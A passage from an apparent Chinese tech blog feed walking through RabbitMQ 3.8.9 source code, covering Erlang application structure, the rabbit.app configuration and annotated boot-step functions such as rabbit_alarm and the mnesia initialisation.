collection"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_restartable_child,</span></span><br><span class="line"><span class="params">                                   [background_gc]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     networking&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%%---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>一个个看过去。。。</p><p>codec_correctness_check：</p><p>执行rabbit_binary_generator:check_empty_frame_size()函数</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%% 检查空的Frame数据的正确性</span></span><br><span class="line"><span class="function"><span class="title">check_empty_frame_size</span><span class="params">()</span> -&gt;</span></span><br><span class="line"><span class="comment">%% Intended to ensure that EMPTY_FRAME_SIZE is defined correctly.</span></span><br><span class="line"><span class="comment">%% 旨在确保EMPTY_FRAME_SIZE正确定义</span></span><br><span class="line"><span class="keyword">case</span> iolist_size(create_frame(?FRAME_BODY, <span class="number">0</span>, &lt;&lt;&gt;&gt;)) <span class="keyword">of</span></span><br><span class="line">?EMPTY_FRAME_SIZE -&gt; ok;</span><br><span class="line">ComputedSize      -&gt; exit(&#123;incorrect_empty_frame_size,</span><br><span class="line">   ComputedSize, ?EMPTY_FRAME_SIZE&#125;)</span><br><span class="line"><span class="keyword">end</span>.</span><br></pre></td></tr></table></figure><p>rabbit_alarm启动:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%% rabbit_alarm进程启动的入口(RabbitMQ App应用启动的时候第一个执行的接口)</span></span><br><span class="line"><span class="function"><span class="title">start_link</span><span class="params">()</span> -&gt;</span></span><br><span class="line">gen_event:start_link(&#123;local, ?SERVER&#125;).</span><br></pre></td></tr></table></figure><p>start函数</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">start</span><span class="params">()</span> -&gt;</span></span><br><span class="line"><span class="comment">%% 启动rabbit_alarm_sup监督进程以及在该监督进程下启动rabbit_alarm进程</span></span><br><span class="line">ok = rabbit_sup:start_restartable_child(?MODULE),</span><br><span class="line"><span class="comment">%% 启动rabbit_alarm对应于rabbit_alarm事件服务器进程的事件处理进程</span></span><br><span class="line">ok = gen_event:add_handler(?SERVER, ?MODULE, []),</span><br><span class="line"><span class="comment">%% 启动vm_memory_monitor_sup监督进程以及在该监督进程下启动vm_memory_monitor进程(虚拟机内存监控进程)</span></span><br><span class="line">&#123;ok, MemoryWatermark&#125; = application:get_env(vm_memory_high_watermark),</span><br><span class="line">rabbit_sup:start_restartable_child(</span><br><span class="line">  vm_memory_monitor, [MemoryWatermark,</span><br><span class="line">  <span class="keyword">fun</span> (Alarm) -&gt;</span><br><span class="line">   <span class="comment">%% 对当前RabbitMQ系统进行一次垃圾回收</span></span><br><span class="line">   background_gc:run(),</span><br><span class="line">   <span class="comment">%% 设置报警器的函数</span></span><br><span class="line">   set_alarm(Alarm)</span><br><span class="line">  <span class="keyword">end</span>,</span><br><span class="line">  <span class="comment">%% 清除报警器的函数</span></span><br><span class="line">  fun clear_alarm/1]),</span><br><span class="line"><span class="comment">%% 启动rabbit_disk_monitor_sup监督进程以及在该监督进程下启动rabbit_disk_monitor进程(硬盘使用监控进程)</span></span><br><span class="line">&#123;ok, DiskLimit&#125; = application:get_env(disk_free_limit),</span><br><span class="line">rabbit_sup:start_delayed_restartable_child(</span><br><span class="line">  rabbit_disk_monitor, [DiskLimit]),</span><br><span class="line">ok.</span><br></pre></td></tr></table></figure><p>database启动：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%%----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">%% Main interface(接口)</span></span><br><span class="line"><span class="comment">%%----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">%% RabbitMQ系统mnesia database启动步骤中执行的函数</span></span><br><span class="line"><span class="function"><span class="title">init</span><span class="params">()</span> -&gt;</span></span><br><span class="line"><span class="comment">%% 确保mnesia数据库的启动</span></span><br><span class="line">ensure_mnesia_running(),</span><br><span class="line"><span class="comment">%% 确保mnesia数据库保存目录的存在</span></span><br><span class="line">ensure_mnesia_dir(),</span><br><span class="line"><span class="comment">%% 判断当前节点是否是新启动的节点</span></span><br><span class="line"><span class="keyword">case</span> is_virgin_node() <span class="keyword">of</span></span><br><span class="line"><span class="literal">true</span>  -&gt; init_from_config();</span><br><span class="line"><span class="literal">false</span> -&gt; NodeType = node_type(),</span><br><span class="line"> init_db_and_upgrade(cluster_nodes(all), NodeType,</span><br><span class="line"> NodeType =:= ram)</span><br><span class="line"><span class="keyword">end</span>,</span><br><span class="line"><span class="comment">%% We intuitively(直观地) expect the global name server to be synced when</span></span><br><span class="line"><span class="comment">%% Mnesia is up. In fact that's not guaranteed(保证) to be the case -</span></span><br><span class="line"><span class="comment">%% let's make it so.</span></span><br><span class="line">ok = rabbit_node_monitor:global_sync(),</span><br><span class="line">ok.</span><br></pre></td></tr></table></figure><p>TO be continue …</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://wudaijun.com/2015/04/erlang-mnesia/" target="_blank" rel="noopener">https://wudaijun.com/2015/04/erlang-mnesia/</a></p><p><a href="https://www.cnblogs.com/hzy1987/p/5441807.html" target="_blank" rel="noopener">https://www.cnblogs.com/hzy1987/p/5441807.html</a></p><p><a href="https://blog.csdn.net/zhangzhizhen1988/article/details/7932449" target="_blank" rel="noopener">https://blog.csdn.net/zhangzhizhen1988/article/details/7932449</a></p><p><a href="http://ninenines.eu/docs/en/cowboy/HEAD/guide/getting_started/" target="_blank" rel="noopener">http://ninenines.eu/docs/en/cowboy/HEAD/guide/getting_started/</a></p><p><a href="https://github.com/ninenines/cowboy" target="_blank" rel="noopener">https://github.com/ninenines/cowboy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="rabbitmq" scheme="http://www.yorzorzy.xyz/categories/rabbitmq/"/>
    
    
      <category term="rabbitmq" scheme="http://www.yorzorzy.xyz/tags/rabbitmq/"/>
    
  </entry>
  
  <entry>
    <title>rabbitmq源码学习一</title>
    <link href="http://www.yorzorzy.xyz/2020/11/17/rabbitmq%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.yorzorzy.xyz/2020/11/17/rabbitmq%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-11-17T09:08:14.307Z</published>
    <updated>2020-11-17T09:06:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="rabbitmq源码学习一"><a href="#rabbitmq源码学习一" class="headerlink" title="rabbitmq源码学习一"></a>rabbitmq源码学习一</h2><h3 id="erlang介绍"><a href="#erlang介绍" class="headerlink" title="erlang介绍"></a>erlang介绍</h3><p>Erlang是具有多重范型的编程语言，具有很多特点，主要的特点有以下几个：</p><ul><li>函数式</li><li>并发性</li><li>分布式</li><li>健壮性</li><li>软实时</li><li>热更新</li><li>递增式代码加载</li><li>动态类型</li><li>解释型</li></ul><p>Erlang是函数式编程语言，函数式是一种编程模型，将计算机中的运算看做是数学中的函数计算，可以避免状态以及变量的概念。</p><p>对象是面向对象的第一型，函数式编程语言也是一样，函数是函数式编程的第一型。函数是Erlang编程语言的基本单位，在Erlang里，函数是第一型，函数几乎会被用作一切，包括最简单的计算。所有的概念都是由函数表达，所有额操作也都是由函数操作。</p><h3 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h3><p>erlang application构成：</p><p>一个应用需要一个.app文件来描述，主要描述它包括哪些文件，参数等。 </p><p>通过application，可以把一个功能模块打包成一个应用，让该模块可以单独start或者stop并且可以在其他模块中引</p><p>用。像mnesia那样。实现步骤：</p><p>1.首先完成要打包的功能模块，并且记得定义为application  —&gt; 文件头加上 -behaviour(application).</p><p>2.为此模块添加.app应用资源文件，格式如下：</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;application, Application, [Opt1,<span class="keyword">...</span>,OptN]&#125;.</span><br></pre></td></tr></table></figure><p>注意：Application 是一个代表应用的名称的原子。文件必须被命名成 Application.app 。<br> 每一个Otp 都是一个定义了应用某种特性的元组 {Key, Value} 。所有的键都是可选。忽略的键会使用默认的值。</p><p>这些属性就是为了让erlang编译器知道该以哪种方式去启动此应用。</p><p>ch_app.app文件如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="selector-tag">application</span>, <span class="selector-tag">ch_app</span>,</span><br><span class="line"><span class="selector-attr">[&#123;description, "Channel allocator"&#125;,</span></span><br><span class="line"><span class="selector-attr">&#123;vsn, "1"&#125;,</span></span><br><span class="line"><span class="selector-attr">&#123;modules, [ch_app, ch_sup, ch3]</span>&#125;,</span><br><span class="line">&#123;<span class="selector-tag">registered</span>, <span class="selector-attr">[ch3]</span>&#125;,</span><br><span class="line">&#123;<span class="selector-tag">applications</span>, <span class="selector-attr">[kernel, stdlib, sasl]</span>&#125;,</span><br><span class="line">&#123;<span class="selector-tag">mod</span>, &#123;<span class="selector-tag">ch_app</span>,<span class="selector-attr">[]</span>&#125;&#125;</span><br><span class="line">]&#125;.</span><br></pre></td></tr></table></figure><p>description<br>简短描述，字符串。默认为“”。<br>vsn<br>版本号，字符串。默认为”“。<br>modules<br>由该应用引入的所有模块。当生成启动脚本和tar文件时， systools 将用到这个列表。一个模块必须被定义于且仅于一个应用。默认为[]<br>registered<br> 应用中所有注册进程的名称。systools 使用这个列表来探测在应用之间是否有名称冲突。默认为 []。<br> applications<br> 所有在此应用之前必须启动的应用。systools 使用该列表来生成正确的启动脚本。默认为 []，但是注意任何应用<br> 都要至少依赖于kernel 和 stdlib </p><p>优势：</p><p>当我们把一个项目中所有的supervision tree通过一个简单的函数game: start(),会发现这个树结构特别复杂，只能有一个根节点，然后一直扩展。<img src="/images/310024519479008.png" alt="QQ五笔截图未命名"></p><p>那么有时，我们会需要：有些功能模块不启动，有些启动，如果再去改这颗树的结构，就会很麻烦。这里，这就是application出现的原因，设计一个可以随时开关的子块（application).比如：上图中的log app, db app ,game app, connect app ..</p><h3 id="总体机制"><a href="#总体机制" class="headerlink" title="总体机制"></a>总体机制</h3><p>rabbitmq启动通过beam.smp来启动，正在的代码程序控制在plugins目录中，通过erlang来启动ez包程序。主进程程序在rabbit.ez文件中。可以通过解压文件查看内部的代码逻辑。</p><p>解压之后：</p><p><img src="/images/image-20201116173407379.png" alt="image-20201116173407379"></p><p>rabbitmq使用erlang的application的结构，通过rabbit.app文件中的结构信息来启动服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">&#123;application, 'rabbit', [</span><br><span class="line">&#123;description, "RabbitMQ"&#125;,</span><br><span class="line">&#123;vsn, "3.8.9"&#125;,</span><br><span class="line">&#123;id, "v3.8.8-2-g5cf3d07"&#125;,</span><br><span class="line">&#123;modules, ['amqqueue','amqqueue_v1','background_gc','code_server_cache','gatherer','gm','lager_exchange_backend','lqueue','mirrored_supervisor_sups','pg_local','rabbit','rabbit_access_control','rabbit_alarm','rabbit_amqqueue','rabbit_amqqueue_process','rabbit_amqqueue_sup','rabbit_amqqueue_sup_sup','rabbit_auth_backend_internal','rabbit_auth_mechanism_amqplain','rabbit_auth_mechanism_cr_demo','rabbit_auth_mechanism_plain','rabbit_autoheal','rabbit_backing_queue','rabbit_basic','rabbit_binding','rabbit_boot_steps','rabbit_channel','rabbit_channel_interceptor','rabbit_channel_sup','rabbit_channel_sup_sup','rabbit_client_sup','rabbit_config','rabbit_connection_helper_sup','rabbit_connection_sup','rabbit_connection_tracking','rabbit_connection_tracking_handler','rabbit_control_pbe','rabbit_core_ff','rabbit_core_metrics_gc','rabbit_credential_validation','rabbit_credential_validator','rabbit_credential_validator_accept_everything','rabbit_credential_validator_min_password_length','rabbit_credential_validator_password_regexp','rabbit_dead_letter','rabbit_definitions','rabbit_diagnostics','rabbit_direct','rabbit_disk_monitor','rabbit_epmd_monitor','rabbit_event_consumer','rabbit_exchange','rabbit_exchange_decorator','rabbit_exchange_parameters','rabbit_exchange_type_direct','rabbit_exchange_type_fanout','rabbit_exchange_type_headers','rabbit_exchange_type_invalid','rabbit_exchange_type_topic','rabbit_feature_flags','rabbit_ff_extra','rabbit_ff_registry','rabbit_fhc_helpers','rabbit_fifo','rabbit_fifo_client','rabbit_fifo_index','rabbit_file','rabbit_framing','rabbit_guid','rabbit_health_check','rabbit_lager','rabbit_limiter','rabbit_log_tail','rabbit_looking_glass','rabbit_maintenance','rabbit_memory_monitor','rabbit_metrics','rabbit_mirror_queue_coordinator','rabbit_mirror_queue_master','rabbit_mirror_queue_misc','rabbit_mirror_queue_mode','rabbit_mirror_queue_mode_all','rabbit_mirror_queue_mode_exactly','rabbit_mirror_queue_mode_nodes','rabbit_mirror_queue_slave','rabbit_mirror_queue_sync','rabbit_mnesia','rabbit_mnesia_rename','rabbit_msg_file','rabbit_msg_store','rabbit_msg_store_ets_index','rabbit_msg_store_gc','rabbit_networking','rabbit_node_monitor','rabbit_nodes','rabbit_parameter_validation','rabbit_password','rabbit_password_hashing_md5','rabbit_password_hashing_sha256','rabbit_password_hashing_sha512','rabbit_peer_discovery','rabbit_peer_discovery_classic_config','rabbit_peer_discovery_dns','rabbit_plugins','rabbit_policies','rabbit_policy','rabbit_policy_merge_strategy','rabbit_prelaunch_cluster','rabbit_prelaunch_enabled_plugins_file','rabbit_prelaunch_feature_flags','rabbit_prelaunch_logging','rabbit_prequeue','rabbit_priority_queue','rabbit_queue_consumers','rabbit_queue_decorator','rabbit_queue_index','rabbit_queue_location_client_local','rabbit_queue_location_min_masters','rabbit_queue_location_random','rabbit_queue_location_validator','rabbit_queue_master_location_misc','rabbit_queue_master_locator','rabbit_quorum_memory_manager','rabbit_quorum_queue','rabbit_reader','rabbit_recovery_terms','rabbit_restartable_sup','rabbit_router','rabbit_runtime_parameters','rabbit_ssl','rabbit_sup','rabbit_sysmon_handler','rabbit_sysmon_minder','rabbit_table','rabbit_trace','rabbit_upgrade','rabbit_upgrade_functions','rabbit_upgrade_preparation','rabbit_variable_queue','rabbit_version','rabbit_vhost','rabbit_vhost_limit','rabbit_vhost_msg_store','rabbit_vhost_process','rabbit_vhost_sup','rabbit_vhost_sup_sup','rabbit_vhost_sup_wrapper','rabbit_vm','supervised_lifecycle','tcp_listener','tcp_listener_sup','term_to_binary_compat','unconfirmed_messages','vhost','vhost_v1']&#125;,</span><br><span class="line">&#123;registered, [rabbit_sup,rabbit_amqqueue_sup,rabbit_direct_client_sup,rabbit_log,rabbit_node_monitor,rabbit_router]&#125;,</span><br><span class="line">&#123;applications, [kernel,stdlib,sasl,rabbitmq_prelaunch,os_mon,inets,compiler,public_key,crypto,ssl,syntax_tools,xmerl,cuttlefish,ranch,lager,rabbit_common,ra,sysmon_handler,stdout_formatter,recon,observer_cli]&#125;,</span><br><span class="line">&#123;mod, &#123;rabbit, []&#125;&#125;,</span><br><span class="line">&#123;env, [</span><br><span class="line">    &#123;tcp_listeners, [5672]&#125;,</span><br><span class="line">    &#123;num_tcp_acceptors, 10&#125;,</span><br><span class="line">    &#123;ssl_listeners, []&#125;,</span><br><span class="line">    &#123;num_ssl_acceptors, 10&#125;,</span><br><span class="line">    &#123;ssl_options, []&#125;,</span><br><span class="line">    &#123;vm_memory_high_watermark, 0.4&#125;,</span><br><span class="line">    &#123;vm_memory_high_watermark_paging_ratio, 0.5&#125;,</span><br><span class="line">    &#123;vm_memory_calculation_strategy, rss&#125;,</span><br><span class="line">    &#123;memory_monitor_interval, 2500&#125;,</span><br><span class="line">    &#123;disk_free_limit, 50000000&#125;, %% 50MB</span><br><span class="line">    &#123;msg_store_index_module, rabbit_msg_store_ets_index&#125;,</span><br><span class="line">    &#123;backing_queue_module, rabbit_variable_queue&#125;,</span><br><span class="line">    %% 0 ("no limit") would make a better default, but that</span><br><span class="line">    %% breaks the QPid Java client</span><br><span class="line">    &#123;frame_max, 131072&#125;,</span><br><span class="line">    %% see rabbitmq-server#1593</span><br><span class="line">    &#123;channel_max, 2047&#125;,</span><br><span class="line">    &#123;connection_max, infinity&#125;,</span><br><span class="line">    &#123;heartbeat, 60&#125;,</span><br><span class="line">    &#123;msg_store_file_size_limit, 16777216&#125;,</span><br><span class="line">    &#123;msg_store_shutdown_timeout, 600000&#125;,</span><br><span class="line">    &#123;fhc_write_buffering, true&#125;,</span><br><span class="line">    &#123;fhc_read_buffering, false&#125;,</span><br><span class="line">    &#123;queue_index_max_journal_entries, 32768&#125;,</span><br><span class="line">    &#123;queue_index_embed_msgs_below, 4096&#125;,</span><br><span class="line">    &#123;default_user, &lt;&lt;"guest"&gt;&gt;&#125;,</span><br><span class="line">    &#123;default_pass, &lt;&lt;"guest"&gt;&gt;&#125;,</span><br><span class="line">    &#123;default_user_tags, [administrator]&#125;,</span><br><span class="line">    &#123;default_vhost, &lt;&lt;"/"&gt;&gt;&#125;,</span><br><span class="line">    &#123;default_permissions, [&lt;&lt;".*"&gt;&gt;, &lt;&lt;".*"&gt;&gt;, &lt;&lt;".*"&gt;&gt;]&#125;,</span><br><span class="line">    &#123;loopback_users, [&lt;&lt;"guest"&gt;&gt;]&#125;,</span><br><span class="line">    &#123;password_hashing_module, rabbit_password_hashing_sha256&#125;,</span><br><span class="line">    &#123;server_properties, []&#125;,</span><br><span class="line">    &#123;collect_statistics, none&#125;,</span><br><span class="line">    &#123;collect_statistics_interval, 5000&#125;,</span><br><span class="line">    &#123;mnesia_table_loading_retry_timeout, 30000&#125;,</span><br><span class="line">    &#123;mnesia_table_loading_retry_limit, 10&#125;,</span><br><span class="line">    &#123;auth_mechanisms, ['PLAIN', 'AMQPLAIN']&#125;,</span><br><span class="line">    &#123;auth_backends, [rabbit_auth_backend_internal]&#125;,</span><br><span class="line">    &#123;delegate_count, 16&#125;,</span><br><span class="line">    &#123;trace_vhosts, []&#125;,</span><br><span class="line">    &#123;ssl_cert_login_from, distinguished_name&#125;,</span><br><span class="line">    &#123;ssl_handshake_timeout, 5000&#125;,</span><br><span class="line">    &#123;ssl_allow_poodle_attack, false&#125;,</span><br><span class="line">    &#123;handshake_timeout, 10000&#125;,</span><br><span class="line">    &#123;reverse_dns_lookups, false&#125;,</span><br><span class="line">    &#123;cluster_partition_handling, ignore&#125;,</span><br><span class="line">    &#123;cluster_keepalive_interval, 10000&#125;,</span><br><span class="line">    &#123;autoheal_state_transition_timeout, 60000&#125;,</span><br><span class="line">    &#123;tcp_listen_options, [&#123;backlog,       128&#125;,</span><br><span class="line">                          &#123;nodelay,       true&#125;,</span><br><span class="line">                          &#123;linger,        &#123;true, 0&#125;&#125;,</span><br><span class="line">                          &#123;exit_on_close, false&#125;</span><br><span class="line">                         ]&#125;,</span><br><span class="line">    &#123;halt_on_upgrade_failure, true&#125;,</span><br><span class="line">    &#123;ssl_apps, [asn1, crypto, public_key, ssl]&#125;,</span><br><span class="line">    %% see rabbitmq-server#114</span><br><span class="line">    &#123;mirroring_flow_control, true&#125;,</span><br><span class="line">    &#123;mirroring_sync_batch_size, 4096&#125;,</span><br><span class="line">    %% see rabbitmq-server#227 and related tickets.</span><br><span class="line">    %% msg_store_credit_disc_bound only takes effect when</span><br><span class="line">    %% messages are persisted to the message store. If messages</span><br><span class="line">    %% are embedded on the queue index, then modifying this</span><br><span class="line">    %% setting has no effect because credit_flow is not used when</span><br><span class="line">    %% writing to the queue index. See the setting</span><br><span class="line">    %% queue_index_embed_msgs_below above.</span><br><span class="line">    &#123;msg_store_credit_disc_bound, &#123;4000, 800&#125;&#125;,</span><br><span class="line">    &#123;msg_store_io_batch_size, 4096&#125;,</span><br><span class="line">    %% see rabbitmq-server#143,</span><br><span class="line">    %% rabbitmq-server#949, rabbitmq-server#1098</span><br><span class="line">    &#123;credit_flow_default_credit, &#123;400, 200&#125;&#125;,</span><br><span class="line">    &#123;quorum_commands_soft_limit, 32&#125;,</span><br><span class="line">    &#123;quorum_cluster_size, 5&#125;,</span><br><span class="line">    %% see rabbitmq-server#248</span><br><span class="line">    %% and rabbitmq-server#667</span><br><span class="line">    &#123;channel_operation_timeout, 15000&#125;,</span><br><span class="line"></span><br><span class="line">    %% see rabbitmq-server#486</span><br><span class="line">    &#123;autocluster,</span><br><span class="line">              [&#123;peer_discovery_backend, rabbit_peer_discovery_classic_config&#125;]</span><br><span class="line">            &#125;,</span><br><span class="line">    %% used by rabbit_peer_discovery_classic_config</span><br><span class="line">    &#123;cluster_nodes, &#123;[], disc&#125;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;config_entry_decoder, [&#123;passphrase, undefined&#125;]&#125;,</span><br><span class="line"></span><br><span class="line">    %% rabbitmq-server#973</span><br><span class="line">    &#123;queue_explicit_gc_run_operation_threshold, 1000&#125;,</span><br><span class="line">    &#123;lazy_queue_explicit_gc_run_operation_threshold, 1000&#125;,</span><br><span class="line">    &#123;background_gc_enabled, false&#125;,</span><br><span class="line">    &#123;background_gc_target_interval, 60000&#125;,</span><br><span class="line">    %% rabbitmq-server#589</span><br><span class="line">    &#123;proxy_protocol, false&#125;,</span><br><span class="line">    &#123;disk_monitor_failure_retries, 10&#125;,</span><br><span class="line">    &#123;disk_monitor_failure_retry_interval, 120000&#125;,</span><br><span class="line">    %% either "stop_node" or "continue".</span><br><span class="line">    %% by default we choose to not terminate the entire node if one</span><br><span class="line">    %% vhost had to shut down, see server#1158 and server#1280</span><br><span class="line">    &#123;vhost_restart_strategy, continue&#125;,</span><br><span class="line">    %% &#123;global, prefetch count&#125;</span><br><span class="line">    &#123;default_consumer_prefetch, &#123;false, 0&#125;&#125;,</span><br><span class="line"><span class="meta">%</span><span class="bash">% interval at <span class="built_in">which</span> the channel can perform periodic actions</span></span><br><span class="line">    &#123;channel_tick_interval, 60000&#125;,</span><br><span class="line">    %% Default max message size is 128 MB</span><br><span class="line">    &#123;max_message_size, 134217728&#125;,</span><br><span class="line">    %% Socket writer will run GC every 1 GB of outgoing data</span><br><span class="line">    &#123;writer_gc_threshold, 1000000000&#125;</span><br><span class="line">  ]&#125;</span><br><span class="line">]&#125;.</span><br></pre></td></tr></table></figure><p>解析该文件，构建有向无环图，然后按照有向无环图的方式来调用函数启动服务进程。</p><p>启动过程：</p><p> 1.rabbit_alarm启动步骤(先执行rabbit_alarm:start()函数)</p><p>​     (1).启动一个rabbit_alarm_sup的supervisor2监督进程同时在该监督进程下启动一个rabbit_alarm的gen_event进程</p><p>​       rabbit_alarm进程作为整个RabbitMQ系统的报警进程，例如内存，磁盘大小的报警，报警后，如果有人向rabbit_alarm进程注册，</p><p>​       则会进程回调，同时会通知集群中的额其他节点</p><p>​     (2).启动一个vm_memory_monitor_sup的supervisor2监督进程同时在该进程下启动一个vm_memory_monitor进程</p><p>​       RabbitMQ系统虚拟机内存监督报警进程，如果虚拟机中的内存少于配置文件配置的大小，则会立刻通知rabbit_alarm进程</p><p>​       该进程就是RabbitMQ系统对内存使用情况监视的进程，如果当前内存使用量超过了配置文件中配置的大小，则会立刻向rabbit_alarm</p><p>​       进程发布内存使用量过大的报警信息，则集群中的所有节点的rabbit_alarm进程则会将内存报警信息回调注册到rabbit_alarm进程的函数</p><p>​     (3).启动一个rabbit_disk_monitor_sup的supervisor2监督进程同时在该监督进程下启动一个rabbit_disk_monitor进程</p><p>​       RabbitMQ系统磁盘使用报警进程，如果磁盘剩余大小少于配置文件中配置的大小，则会立刻通知rabbit_alarm进程</p><p>​       该进程就是RabbitMQ系统对磁盘使用情况监视的进程，如果磁盘剩余量少于配置文件中配置的大小，则会立刻向rabbit_alarm进程</p><p>​       发布报警信息，则集群中的所有节点的rabbit_alarm进程都会将报警信息回调注册到rabbit_alarm进程的函数</p><p>  2.file_handle_cache启动步骤</p><p>​     (1).执行rabbit:start_fhc()函数启动file_handle_cache进程(该进程是RabbitMQ系统文件打开关闭操作关键进程)</p><p>​       该进程是RabbitMQ系统所有操作磁盘文件相关操作的进程</p><p>  3.worker_pool启动步骤(RabbitMQ系统异步执行任务的小系统)</p><p>​     (1).首先启动一个worker_pool_sup的supervisor的监督进程</p><p>​     (2).worker_pool_sup监督进程下再启动一个worker_pool的进程池管理进程</p><p>​     (3).worker_pool_sup监督进程下再启动调度线程个数的worker_pool_worker的工作进程</p><p>​       该监督树下的进程是用来异步提交函数让工作进程执行完成，worker_pool_worker为工作进程，worker_pool为所有worker_pool_worker进程的管理者，哪个</p><p>​       worker_pool_worker进程空闲，哪个worker_pool_worker正在工作，worker_pool进程都有记录</p><p>  4.database启动步骤(初始化RabbitMQ中的mnesia数据库，如果配置有集群数据库，自动连接到集群数据库)</p><p>​     (1).执行rabbit_mnesia:init()函数</p><p>​       该操作步骤是启动当前RabbitMQ节点的Mnesia数据库，同时将本节点同集群中的其他节点连接起来，并将集群中的数据同自己本地的数据进行同步，然后将</p><p>​       RabbitMQ系统所有的数据库表启动起来</p><p>  5.database_sync启动步骤</p><p>​     (1).执行rabbit_sup:start_child(mnesia_sync)函数</p><p>​       